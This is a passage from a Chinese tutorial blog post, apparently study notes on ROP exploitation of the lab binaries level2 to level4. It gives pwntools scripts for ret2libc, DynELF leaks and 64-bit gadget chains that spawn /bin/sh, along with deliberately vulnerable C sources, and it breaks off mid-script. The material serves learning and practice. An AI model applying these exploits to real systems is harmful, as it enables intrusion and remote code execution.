src="/2019/04/09/蒸米ROP学习笔记/14.png" alt=""></p><blockquote><p>除了程序本身的函数之外，还有read@plt()和write@plt()函数可用，但因为程序本身没有调用system()函数因此并不能直接调用system()来获取shell。但其实我们有write@plt()函数就够了，因为我们可以通过write@plt ()函数把write()函数在内存中的地址也就是write.got给打印出来。</p><p>既然write()函数实现是在libc.so当中，那我们调用的write@plt()函数为什么也能实现write()功能呢? 这是因为linux采用了延时绑定技术，当我们调用write@plit()的时候，系统会将真正的write()函数地址link到got表的write.got中，然后write@plit()会根据write.got跳转到真正的write()函数上去。（如果还是搞不清楚的话，推荐阅读《程序员的自我修养 - 链接、装载与库》这本书）</p><p>因为system()函数和write()在libc.so中的offset(相对地址)是不变的，所以如果我们得到了write()的地址并且拥有目标服务器上的libc.so就可以计算出system()在内存中的地址了。</p><p>然后我们再将pc指针return回vulnerable_function()函数，就可以进行ret2libc溢出攻击，并且这一次我们知道了system()在内存中的地址，就可以调用system()函数来获取我们的shell了。</p><p>使用ldd命令可以查看目标程序调用的so库。随后我们把libc.so拷贝到当前目录，因为我们的exp需要这个so文件来计算相对地址：</p></blockquote><p><img src="/2019/04/09/蒸米ROP学习笔记/15.png" alt=""></p><p>当然，除了用ldd命令查看libc.so库，还可以直接用pwntools库的elf.libc来获取libc.so库：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">"./level2"</span>)</span><br><span class="line">libc = elf.libc</span><br></pre></td></tr></table></figure><p>编写payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process("./level2")</span></span><br><span class="line">p = remote(<span class="string">"127.0.0.1"</span>, <span class="number">10001</span>)</span><br><span class="line">elf = ELF(<span class="string">"./level2"</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">write_plt = elf.plt[<span class="string">"write"</span>]</span><br><span class="line">write_got = elf.got[<span class="string">"write"</span>]</span><br><span class="line">vulnerable_function_addr = elf.symbols[<span class="string">"vulnerable_function"</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]write() plt: "</span> + hex(write_plt)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]write() got: "</span> + hex(write_got)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]vulnerable_function() addr: "</span> + hex(vulnerable_function_addr)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">140</span> + p32(write_plt) + p32(vulnerable_function_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]sending payload1 to leak write libc addr..."</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]leak write libc addr: "</span> + hex(write_addr)</span><br><span class="line"></span><br><span class="line">libc.address = write_addr - libc.symbols[<span class="string">"write"</span>]</span><br><span class="line">system_addr = libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">binsh_addr = next(libc.search(<span class="string">"/bin/sh"</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]system() addr: "</span> + hex(system_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]binsh addr: "</span> + hex(binsh_addr)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">"A"</span> * <span class="number">140</span> + p32(system_addr) + p32(<span class="number">0xdeedbeef</span>) + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]sending payload2 to getshell..."</span></span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2019/04/09/蒸米ROP学习笔记/16.png" alt=""></p><p>另一种是ldd命令查找再赋值libc.so文件到当前目录再加载的payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process("./level2")</span></span><br><span class="line">p = remote(<span class="string">"127.0.0.1"</span>, <span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./level2"</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">"libc.so.6"</span>)</span><br><span class="line"><span class="comment">#libc = elf.libc</span></span><br><span class="line">write_plt = elf.plt[<span class="string">"write"</span>]</span><br><span class="line">write_got = elf.got[<span class="string">"write"</span>]</span><br><span class="line">vulnerable_function_addr = elf.symbols[<span class="string">"vulnerable_function"</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]write() plt: "</span> + hex(write_plt)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]write() got: "</span> + hex(write_got)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]vulnerable_function() addr: "</span> + hex(vulnerable_function_addr)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">140</span> + p32(write_plt) + p32(vulnerable_function_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]sending payload1 to leak write libc addr..."</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]leak write libc addr: "</span> + hex(write_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#libc.address = write_addr - libc.symbols["write"]</span></span><br><span class="line">system_addr = libc.symbols[<span class="string">"system"</span>] + write_addr - libc.symbols[<span class="string">"write"</span>]</span><br><span class="line">binsh_addr = next(libc.search(<span class="string">"/bin/sh"</span>)) + write_addr - libc.symbols[<span class="string">"write"</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]system() addr: "</span> + hex(system_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]binsh addr: "</span> + hex(binsh_addr)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">"A"</span> * <span class="number">140</span> + p32(system_addr) + p32(<span class="number">0xdeedbeef</span>) + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]sending payload2 to getshell..."</span></span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="level2——Memory-Leak-amp-DynELF"><a href="#level2——Memory-Leak-amp-DynELF" class="headerlink" title="level2——Memory Leak &amp; DynELF"></a>level2——Memory Leak &amp; DynELF</h3><p>本小节介绍了在不获取目标libc.so的情况下进行ROP攻击。</p><p>前面一小节我们用到了目标机器的libc.so才能计算出libc中system()和/bin/sh等的地址来实现攻击，但是如果我们在获取不到目标机器上的libc.so情况下，应该如何做呢？这时候就需要通过memory leak(内存泄露)来搜索内存找到system()的地址。</p><blockquote><p>这里我们采用pwntools提供的DynELF模块来进行内存搜索。首先我们需要实现一个leak(address)函数，通过这个函数可以获取到某个地址上最少1 byte的数据。拿我们上一篇中的level2程序举例。leak函数应该是这样实现的：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">    payload1 = <span class="string">'a'</span>*<span class="number">140</span> + p32(plt_write) + p32(vulfun_addr) + p32(<span class="number">1</span>) +p32(address) + p32(<span class="number">4</span>)</span><br><span class="line">    p.send(payload1)</span><br><span class="line">    data = p.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"%#x =&gt; %s"</span> % (address, (data <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>))</span><br><span class="line"><span class="keyword">return</span> data</span><br></pre></td></tr></table></figure><blockquote><p>随后将这个函数作为参数再调用d = DynELF(leak, elf=ELF(‘./level2’))就可以对DynELF模块进行初始化了。然后可以通过调用system_addr = d.lookup(‘system’, ‘libc’)来得到libc.so中system()在内存中的地址。</p><p>要注意的是，通过DynELF模块只能获取到system()在内存中的地址，但无法获取字符串“/bin/sh”在内存中的地址。所以我们在payload中需要调用read()将“/bin/sh”这字符串写入到程序的.bss段中。.bss段是用来保存全局变量的值的，地址固定，并且可以读可写。通过readelf -S level2这个命令就可以获取到bss段的地址了。</p></blockquote><p><img src="/2019/04/09/蒸米ROP学习笔记/17.png" alt=""></p><p>当然，可以在pwntools中直接调用elf.bss()获取.bss段地址：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">elf = ELF(<span class="string">"./level2"</span>)</span><br><span class="line">bss_base = elf.bss()</span><br></pre></td></tr></table></figure><p>因为我们在执行完read()之后要接着调用system(“/bin/sh”)，并且read()这个函数的参数有三个，所以我们需要一个pop pop pop ret的gadget用来保证栈平衡。这里我们用ROPgadget来寻找：</p><p><img src="/2019/04/09/蒸米ROP学习笔记/18.png" alt=""></p><p>编写payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"127.0.0.1"</span>, <span class="number">10001</span>)</span><br><span class="line"><span class="comment">#p = process("./level2")</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./level2"</span>)</span><br><span class="line">bss_base = elf.bss()</span><br><span class="line">plt_write = elf.plt[<span class="string">"write"</span>]</span><br><span class="line">plt_read = elf.plt[<span class="string">"read"</span>]</span><br><span class="line">vulfun_addr = elf.symbols[<span class="string">"vulnerable_function"</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]write() plt: "</span> + hex(plt_write)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]read() plt: "</span> + hex(plt_read)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]vulnerable_function() addr: "</span> + hex(vulfun_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*].bss addr: "</span> + hex(bss_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">        payload1 = <span class="string">'a'</span>*<span class="number">140</span> + p32(plt_write) + p32(vulfun_addr) + p32(<span class="number">1</span>) +p32(address) + p32(<span class="number">4</span>)</span><br><span class="line">        p.send(payload1)</span><br><span class="line">        data = p.recv(<span class="number">4</span>)</span><br><span class="line">        <span class="comment">#print "%#x =&gt; %s" % (address, (data or '').encode('hex'))</span></span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">d = DynELF(leak, elf=ELF(<span class="string">'./level2'</span>))</span><br><span class="line"></span><br><span class="line">execve_addr = d.lookup(<span class="string">'execve'</span>, <span class="string">'libc'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]execve() addr: "</span> + hex(execve_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#system_addr = d.lookup('system', 'libc')</span></span><br><span class="line"><span class="comment">#print "[*]system() addr: " + hex(system_addr)</span></span><br><span class="line"></span><br><span class="line">pop_pop_pop_ret = <span class="number">0x080484f9</span></span><br><span class="line">payload2 = <span class="string">"A"</span> * <span class="number">140</span> + p32(plt_read) + p32(pop_pop_pop_ret) + p32(<span class="number">0</span>) + p32(bss_base) + p32(<span class="number">8</span>)</span><br><span class="line"><span class="comment">#payload2 += p32(system_addr) + p32(vulfun_addr) + p32(bss_base)</span></span><br><span class="line">payload2 += p32(execve_addr) + p32(vulfun_addr) + p32(bss_base) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.sendline(<span class="string">"/bin/sh\0"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>本地环境中system()函数执行有问题，老得不到shell，换了execve()函数即可：</p><p><img src="/2019/04/09/蒸米ROP学习笔记/19.png" alt=""></p><h2 id="0x02-64位ROP"><a href="#0x02-64位ROP" class="headerlink" title="0x02 64位ROP"></a>0x02 64位ROP</h2><h3 id="level3——64位与32位区别"><a href="#level3——64位与32位区别" class="headerlink" title="level3——64位与32位区别"></a>level3——64位与32位区别</h3><blockquote><p>linux_64与linux_86的区别主要有两点：<strong>首先是内存地址的范围由32位变成了64位</strong>。但是可以使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常。<strong>其次是函数参数的传递方式发生了改变</strong>，x86中参数都是保存在栈上，但在x64中的前六个参数依次保存在RDI，RSI，RDX，RCX，R8和 R9中，如果还有更多的参数的话才会保存在栈上。</p></blockquote><p>level3.c代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">callsystem</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable_function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(STDIN_FILENO, buf, <span class="number">512</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">    write(STDOUT_FILENO, <span class="string">"Hello, World\n"</span>, <span class="number">13</span>);</span><br><span class="line">    vulnerable_function();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>默认打开系统的ASLR，然后用如下gcc命令编译，即不开启Canary：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector level3.c -o level3</span><br></pre></td></tr></table></figure><p>查看基本功能和安全编译选项开关：</p><p><img src="/2019/04/09/蒸米ROP学习笔记/20.png" alt=""></p><p>通过GDB的调试，用pattern创建大量字符串发送过去，程序终止在vulnerable_function()函数处：</p><p><img src="/2019/04/09/蒸米ROP学习笔记/21.png" alt=""></p><blockquote><p>奇怪的事情发生了，PC指针并没有指向类似于0x41414141那样地址，而是停在了vulnerable_function()函数中。这是为什么呢？原因就是我们之前提到过的程序使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常。但是，虽然PC不能跳转到那个地址，我们依然可以通过栈来计算出溢出点。因为ret相当于“pop rip”指令，所以我们只要看一下栈顶的数值就能知道PC跳转的地址了。</p></blockquote><p><img src="/2019/04/09/蒸米ROP学习笔记/22.png" alt=""></p><p>因此我们得到了136的偏移地址。</p><p>我们再构造一次payload，并且跳转到一个小于0x00007fffffffffff的地址，看看这次能否控制pc的指针：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'print "A"*136+"ABCDEF\x00\x00"'</span> &gt; payload</span><br><span class="line">gdb level3</span><br><span class="line">(gdb) r &lt; payload</span><br></pre></td></tr></table></figure><p><img src="/2019/04/09/蒸米ROP学习笔记/23.png" alt=""></p><p>可以看到我们已经成功的控制了PC的指针了。</p><p>知道了偏移量，且程序中本来就存在一个callsystem()函数，其会直接调用system(“/bin/sh”)，那就简单多了。</p><p>编写payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./level3"</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./level3"</span>)</span><br><span class="line">callsystem_addr = elf.symbols[<span class="string">"callsystem"</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]callsystem() addr: "</span> + hex(callsystem_addr)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">136</span> + p64(callsystem_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]sending payload..."</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2019/04/09/蒸米ROP学习笔记/24.png" alt=""></p><h3 id="level4——使用工具寻找gadgets"><a href="#level4——使用工具寻找gadgets" class="headerlink" title="level4——使用工具寻找gadgets"></a>level4——使用工具寻找gadgets</h3><blockquote><p>我们之前提到x86中参数都是保存在栈上，但在x64中前六个参数依次保存在RDI，RSI，RDX，RCX，R8和 R9寄存器里，如果还有更多的参数的话才会保存在栈上。所以我们需要寻找一些类似于pop rdi; ret的这种gadget。如果是简单的gadgets，我们可以通过objdump来查找。但当我们打算寻找一些复杂的gadgets的时候，还是借助于一些查找gadgets的工具比较方便。比较有名的工具有：</p><p><strong>ROPEME</strong>: <a href="https://github.com/packz/ropeme" target="_blank" rel="noopener">https://github.com/packz/ropeme</a></p><p><strong>Ropper</strong>: <a href="https://github.com/sashs/Ropper" target="_blank" rel="noopener">https://github.com/sashs/Ropper</a></p><p><strong>ROPgadget</strong>: <a href="https://github.com/JonathanSalwan/ROPgadget/tree/master" target="_blank" rel="noopener">https://github.com/JonathanSa…</a></p><p><strong>rp++</strong>: <a href="https://github.com/0vercl0k/rp" target="_blank" rel="noopener">https://github.com/0vercl0k/rp</a></p><p>这些工具功能上都差不多，找一款自己能用的惯的即可。</p></blockquote><p>level4.c代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">systemaddr</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span>* handle = dlopen(<span class="string">"libc.so.6"</span>, RTLD_LAZY);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%p\n"</span>,dlsym(handle,<span class="string">"system"</span>));</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable_function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(STDIN_FILENO, buf, <span class="number">512</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">    systemaddr();</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">"Hello, World\n"</span>, <span class="number">13</span>);</span><br><span class="line">    vulnerable_function();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译，因为程序用到了dlopen()函数打开libc，因此需要-ldl参数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector level4.c -o level4 -ldl</span><br></pre></td></tr></table></figure><p>64位程序，动态链接文件，只开启了NX：</p><p><img src="/2019/04/09/蒸米ROP学习笔记/25.png" alt=""></p><p>用IDA分析，看到程序在一开始运行时调用systemaddr()函数，该函数会从本程序用到的libc.so.6中获取其中的system()函数地址并打印出来：</p><p><img src="/2019/04/09/蒸米ROP学习笔记/26.png" alt=""></p><p>和level3一样得到溢出偏移量为136。</p><p>下面开始使用工具来寻找合适的Gadgets。</p><p>因为我们知道了溢出偏移量和system()函数的地址，剩下的就是通过寄存器给system()函数传参了，而在64位中传参的前六个参数是通过寄存器来实现的，而且system()只接受一个参数，因此我们需要找到一条pop rdi;ret的Gadget来帮助我们实现，这里我们用的是ROPgadget工具帮我们查找：</p><p><img src="/2019/04/09/蒸米ROP学习笔记/27.png" alt=""></p><p>当然，一般情况下自身的程序可能没有合适的Gadgets，这时我们可以到指定的libc.so文件中找到合适的：</p><p><img src="/2019/04/09/蒸米ROP学习笔记/29.png" alt=""></p><p>编写payload，有两个Gadget可选，如果用的是libc中的Gadget则需要加上libc的实际地址来计算出该gadget的实际地址，因为libc.address = offset = system_addr - libc.symbols[‘system’] = gadget实际地址 - gadget在libc中地址：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./level4"</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./level4"</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="comment">## self gadget</span></span><br><span class="line"><span class="comment">#pop_rdi_ret_addr = 0x00000000004008b3</span></span><br><span class="line"><span class="comment">## libc gadget</span></span><br><span class="line">pop_rdi_ret_libc = <span class="number">0x0000000000021102</span></span><br><span class="line"></span><br><span class="line">system_addr = int(p.recv(<span class="number">1024</span>).split()[<span class="number">0</span>], <span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]recv system() addr: "</span> + hex(system_addr)</span><br><span class="line"></span><br><span class="line">libc.address = system_addr - libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">binsh_addr = next(libc.search(<span class="string">"/bin/sh"</span>))</span><br><span class="line"><span class="comment">## libc gadget + libc addr</span></span><br><span class="line">pop_rdi_ret_addr = pop_rdi_ret_libc + libc.address</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]/bin/sh libc addr: "</span> + hex(binsh_addr)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">136</span> + p64(pop_rdi_ret_addr) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]sending payload..."</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2019/04/09/蒸米ROP学习笔记/28.png" alt=""></p><p>除了前面找的pop rdi;ret这个Gadget，我们还可以找另外一个gadget，因为我们只需调用一次system()函数就可以获取shell，所以我们也可以搜索不带ret的gadgets来构造ROP链，如下：</p><p><img src="/2019/04/09/蒸米ROP学习笔记/30.png" alt=""></p><p>可以看到pop rax;pop rdi;call rax这个gadget，我们可以先将rax赋值为system()的地址，rdi赋值为“/bin/sh”的地址，最后再调用call rax即可。</p><p>payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./level4"</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./level4"</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="comment">#pop|ret</span></span><br><span class="line"><span class="comment">## self gadget</span></span><br><span class="line"><span class="comment">#pop_rdi_ret_addr = 0x00000000004008b3</span></span><br><span class="line"><span class="comment">## libc gadget</span></span><br><span class="line"><span class="comment">#pop_rdi_ret_libc = 0x0000000000021102</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#pop|call</span></span><br><span class="line">pop_call_libc = <span class="number">0x0000000000107419</span></span><br><span class="line"></span><br><span class="line">system_addr = int(p.recv(<span 